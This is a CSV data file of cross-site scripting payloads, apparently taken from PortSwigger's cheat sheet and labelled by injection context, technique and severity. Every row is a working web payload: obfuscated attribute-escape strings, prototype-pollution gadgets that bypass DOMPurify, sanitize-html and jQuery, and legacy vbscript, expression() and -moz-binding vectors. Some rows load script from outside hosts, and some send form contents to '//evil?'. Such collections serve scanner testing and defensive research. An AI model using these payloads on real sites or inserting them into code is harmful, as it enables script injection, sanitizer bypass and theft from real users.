payload,context,technique,severity,length,source
"';parent['\x65\x76\x61\x6c']('parent[""\x61\x6c\x65\x72\x74""](parent[""\x61\x74\x6f\x62""](""WFNT""))');//",attribute_escape,encoding,medium,101,portswigger
"';frames['\x65\x76\x61\x6c']('frames[""\x61\x6c\x65\x72\x74""](frames[""\x61\x74\x6f\x62""](""WFNT""))');//",attribute_escape,encoding,medium,101,portswigger
"';globalThis['\x65\x76\x61\x6c']('globalThis[""\x61\x6c\x65\x72\x74""](globalThis[""\x61\x74\x6f\x62""](""WFNT""))');//",attribute_escape,encoding,medium,113,portswigger
';window['\141\154\145\162\164']('\130\123\123');//,attribute_escape,obfuscation,medium,51,portswigger
';self['\141\154\145\162\164']('\130\123\123');//,attribute_escape,obfuscation,medium,49,portswigger
';this['\141\154\145\162\164']('\130\123\123');//,attribute_escape,obfuscation,medium,49,portswigger
';top['\141\154\145\162\164']('\130\123\123');//,attribute_escape,obfuscation,medium,48,portswigger
';parent['\141\154\145\162\164']('\130\123\123');//,attribute_escape,obfuscation,medium,51,portswigger
';frames['\141\154\145\162\164']('\130\123\123');//,attribute_escape,obfuscation,medium,51,portswigger
';globalThis['\141\154\145\162\164']('\130\123\123');//,attribute_escape,obfuscation,medium,55,portswigger
';window['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,encoding,medium,83,portswigger
';self['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,encoding,medium,81,portswigger
';this['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,encoding,medium,81,portswigger
';top['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,encoding,medium,80,portswigger
';parent['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,encoding,medium,83,portswigger
';frames['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,encoding,medium,83,portswigger
';globalThis['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,encoding,medium,87,portswigger
';window[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,51,portswigger
';self[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,49,portswigger
';this[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,49,portswigger
';top[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,48,portswigger
';parent[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,51,portswigger
';frames[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,51,portswigger
';globalThis[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,55,portswigger
';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,attribute_escape,obfuscation,medium,125,portswigger
';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,attribute_escape,obfuscation,medium,123,portswigger
';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,attribute_escape,obfuscation,medium,123,portswigger
';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,attribute_escape,obfuscation,medium,122,portswigger
';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,attribute_escape,obfuscation,medium,125,portswigger
';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,attribute_escape,obfuscation,medium,125,portswigger
';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,attribute_escape,obfuscation,medium,129,portswigger
<script>Object.prototype.innerHTML = '<img/src/onerror=alert(1)>';</script>,dom_sink,event_handler,high,75,portswigger
<script>Object.prototype.preventDefault='x';Object.prototype.handleObj='x';Object.prototype.delegateTarget='<img/src/onerror=alert(1)>';/* No extra code needed for jQuery 1 & 2 */$(document).off('foobar');</script>,script_injection,obfuscation,high,214,portswigger
"<script>Object.prototype.div=['1','<img src onerror=alert(1)>','1']</script><script>$('<div x=""x""></div>')</script>",script_injection,event_handler,high,115,portswigger
"<script>Object.prototype.url = ['data:,alert(1)//'];Object.prototype.dataType = 'script';</script><script>$.get('https://google.com/');$.post('https://google.com/');</script>",script_injection,obfuscation,high,174,portswigger
"<script>Object.prototype.src = ['data:,alert(1)//']</script><script>$.getScript('https://google.com/')</script>",script_injection,obfuscation,high,111,portswigger
"<script>Object.prototype.url = 'data:,alert(1)//'</script><script>$.getScript('https://google.com/')</script>",script_injection,obfuscation,high,109,portswigger
"<script>Object.prototype.srcdoc=['<script>alert(1)<\/script>']</script><div class=""g-recaptcha"" data-sitekey=""your-site-key""/>",script_injection,script_tag,high,126,portswigger
<script>Object.prototype.hif = ['javascript:alert(document.domain)'];</script>,script_injection,script_tag,high,78,portswigger
<script>Object.prototype.attrs = {src:1};Object.prototype.src='https://portswigger-labs.net/xss/xss.js'</script>,script_injection,obfuscation,high,112,portswigger
<script>Object.prototype.BOOMR = 1;Object.prototype.url='https://portswigger-labs.net/xss/xss.js'</script>,script_injection,obfuscation,high,106,portswigger
<script>Object.prototype.sourceURL = '\u2028\u2029alert(1)'</script><script>_.template('test')</script>,script_injection,encoding,high,103,portswigger
<script>Object.prototype['*'] = ['onload']</script><script>document.write(sanitizeHtml('<iframe onload=alert(1)>'))</script>,dom_sink,event_handler,high,124,portswigger
"<script>Object.prototype.whiteList = {img: ['onerror', 'src']}</script><script>document.write(filterXSS('<img src onerror=alert(1)>'))</script>",dom_sink,event_handler,high,143,portswigger
"<script>Object.prototype.ALLOWED_ATTR = ['onerror', 'src']</script><script>document.write(DOMPurify.sanitize('<img src onerror=alert(1)>'))</script>",dom_sink,event_handler,high,148,portswigger
<script>Object.prototype.documentMode = 9</script>,script_injection,script_tag,high,50,portswigger
<script>const html = '<img src onerror=alert(1)>';const sanitizer = new goog.html.sanitizer.HtmlSanitizer();const sanitized = sanitizer.sanitize(html);const node = goog.dom.safeHtmlToNode(sanitized);document.body.append(node);</script>,script_injection,event_handler,high,235,portswigger
"<script>Object.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//';</script>",script_injection,obfuscation,high,73,portswigger
"<script>Object.prototype.tagName = 'img'Object.prototype.src = ['x:x']Object.prototype.onerror = ['alert(1)']</script><script>(function() {var View = Mn.View.extend({template: '#template-layout'});var App = Mn.Application.extend({region: '#app', onStart: function() {this.showView(new View());}});var app = new App();app.start();})();</script><div id=""template-layout"" type=""x-template/underscore"">xxx</div>",script_injection,script_tag,high,407,portswigger
"<script>Object.prototype.src='data:,alert(1)//'</script>",script_injection,obfuscation,high,56,portswigger
<script>Object.prototype.onload = 'alert(1)'</script>,script_injection,script_tag,high,53,portswigger
"<script>Object.prototype.script = [1,'<img/src/onerror=alert(1)>','<img/src/onerror=alert(2)>']</script>",script_injection,event_handler,high,104,portswigger
"<strong data-bind=""text:'hello'""></strong><script>Object.prototype[4]=""a':1,[alert(1)]:1,'b"";Object.prototype[5]=',';</script><script>ko.applyBindings({})</script>",script_injection,script_tag,high,163,portswigger
"<script>Object.prototype.on = 'click';$('body').on('click', function() { alert('Injected Event'); });$('body').trigger('click');</script>",script_injection,script_tag,high,137,portswigger
"<img src=""javascript:alert(1)"">",generic,protocol,medium,31,portswigger
"<body background=""javascript:alert(1)"">",generic,protocol,medium,39,portswigger
"<iframe src=""data:text/html,<img src=1 onerror=alert(document.domain)>"">",attribute,event_handler,high,72,portswigger
"<a href=""vbscript:MsgBox+1"">XSS</a>
<a href=""#"" onclick=""vbs:Msgbox+1"">XSS</a>
<a href=""#"" onclick=""VBS:Msgbox+1"">XSS</a>
<a href=""#"" onclick=""vbscript:Msgbox+1"">XSS</a>
<a href=""#"" onclick=""VBSCRIPT:Msgbox+1"">XSS</a>
<a href=""#"" language=vbs onclick=""vbscript:Msgbox+1"">XSS</a>",attribute,event_handler,medium,278,portswigger
"<a href=""#"" onclick=""jscript.compact:alert(1);"">test</a>
<a href=""#"" onclick=""JSCRIPT.COMPACT:alert(1);"">test</a>",attribute,event_handler,medium,113,portswigger
"<a href=# language=""JScript.Encode"" onclick=""#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@"">XSS</a>
<a href=# onclick=""JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@"">XSS</a>",attribute,event_handler,medium,162,portswigger
"<iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>
<iframe language=VBScript.Encode onload=#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>",event_handler,event_handler,high,138,portswigger
"<a title=""&{alert(1)}"">XSS</a>",generic,tag_injection,medium,30,portswigger
"<link href=""xss.js"" rel=stylesheet type=""text/javascript"">",generic,tag_injection,medium,58,portswigger
<form><button name=x formaction=x><b>stealme,generic,tag_injection,medium,44,portswigger
"<form action=x><button>XSS</button><select name=x><option><plaintext><script>token=""supersecret""</script>",script_injection,script_tag,high,105,portswigger
"<div style=""-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)"">
<div style=""\-\mo\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)"">
<div style=""-moz-bindin\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)"">
<div style=""-moz-bindin&#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)"">",generic,encoding,medium,309,portswigger
"<img src=""blah"" style=""-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)"" />",generic,obfuscation,medium,610,portswigger
"<div style=xss:expression(alert(1))>
<div style=xss:expression(1)-alert(1)>
<div style=xss:expressio\6e(alert(1))>
<div style=xss:expressio\006e(alert(1))>
<div style=xss:expressio\00006e(alert(1))>
<div style=xss:expressio\6e(alert(1))>
<div style=xss:expressio&#x5c;6e(alert(1))>",generic,encoding,medium,281,portswigger
"<div style=xss=expression(alert(1))>
<div style=""color&#x3dred"">test</div>",generic,encoding,medium,74,portswigger
"<a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:alert(1)"">XSS</a>",generic,protocol,medium,83,portswigger
"<script>
function window.onload(){
alert(1);
}
</script>
<script>
function window::onload(){
alert(1);
}
</script>
<script>
function window.location(){
}
</script>
<body>
<script>
function/*<img src=1 onerror=alert(1)>*/document.body.innerHTML(){}
</script>
</body>
<body>
<script>
function document.body.innerHTML(){ x = ""<img src=1 onerror=alert(1)>""; }
</script>
</body>",dom_sink,obfuscation,high,373,portswigger
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS<img src=1 onerror=alert(1)>""> </BODY></HTML>",attribute,event_handler,high,215,portswigger
"<a href=""javascript& #x6a;avascript:alert(1)"">Firefox</a>",generic,tag_injection,medium,57,portswigger
"<a href=""javascript& colon ;alert(1)"">Firefox</a>",generic,tag_injection,medium,49,portswigger
"<!- - ><img title=""--><iframe/onload=alert(1)>""> -->
<!-     - ><img title=""--><iframe/onload=alert(1)>""> -->",attribute,event_handler,high,109,portswigger
<svg><xss onload=alert(1)>,event_handler,event_handler,high,26,portswigger
"<isindex type=image src=""//evil?",generic,obfuscation,medium,32,portswigger
"<isindex type=submit style=width:100%;height:100%; value=XSS formaction=""//evil?",generic,obfuscation,medium,80,portswigger
<isindex type=submit formaction=javascript:alert(1)>,generic,protocol,medium,52,portswigger
<isindex type=submit action=javascript:alert(1)>,generic,protocol,medium,48,portswigger
<svg><discard onbegin=alert(1)>,event_handler,event_handler,high,31,portswigger
"<svg><use href=""//subdomain1.portswigger-labs.net/use_element/upload.php#x"" /></svg>",generic,obfuscation,medium,84,portswigger
<img src=validimage.png onloadstart=alert(1)>,event_handler,event_handler,medium,45,portswigger
<input type=image onloadend=alert(1) src=validimage.png>,event_handler,event_handler,medium,56,portswigger
<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>,event_handler,event_handler,medium,55,portswigger
<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>,event_handler,event_handler,medium,55,portswigger
<marquee onstart=alert(1)>XSS</marquee>,event_handler,event_handler,medium,39,portswigger
<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>,event_handler,event_handler,medium,90,portswigger
<script>location.protocol='javascript'</script>,script_injection,script_tag,high,47,portswigger
"<a href=""%0aalert(1)"" onclick=""protocol='javascript'"">test</a>",attribute,event_handler,medium,62,portswigger
"<svg><use href=""data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x"" /></svg>",generic,protocol,medium,270,portswigger
"<svg><use href=""data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x"" />",attribute,obfuscation,high,149,portswigger
"<a href=""javascript://%0aalert(1)"">XSS</a>",generic,obfuscation,medium,42,portswigger
"<base href=""javascript:/a/-alert(1)///////""><a href=../lol/safari.html>test</a>",generic,obfuscation,medium,79,portswigger
"<object data=""javascript:alert(1)"">",generic,protocol,medium,35,portswigger
"<embed src=""javascript:alert(1)"">",generic,protocol,medium,33,portswigger
<object data=# codebase=javascript:alert(document.domain)//>,generic,obfuscation,medium,60,portswigger
<embed src=# codebase=javascript:alert(document.domain)//>,generic,obfuscation,medium,58,portswigger
"<object data=""#
alert(1)"" codebase=javascript://>",generic,obfuscation,medium,49,portswigger
"<object data=""#!
alert(1)"" codebase=javascript:>",generic,protocol,medium,48,portswigger
"<embed src=""#
alert(1)"" codebase=javascript://>",generic,obfuscation,medium,47,portswigger
"<embed src=""#!
alert(1)"" codebase=javascript:>",generic,protocol,medium,46,portswigger
"<script>throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:name}</script>",script_injection,event_handler,high,89,portswigger
"<svg onload=""throw top.onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+URL}"">",attribute,obfuscation,high,95,portswigger
"<body onload=""throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+location}"">",attribute,obfuscation,high,97,portswigger
"<svg><use href=""data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x""></use></svg>",generic,obfuscation,medium,257,portswigger
"<svg><animate xlink:href=""#x"" attributeName=""href"" values=""data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x"" /><use id=x />",attribute,obfuscation,high,204,portswigger
<x onbeforescriptexecute=alert(1)><script>1</script>,script_injection,event_handler,high,52,portswigger
<x onafterscriptexecute=alert(1)><script>1</script>,script_injection,event_handler,high,51,portswigger
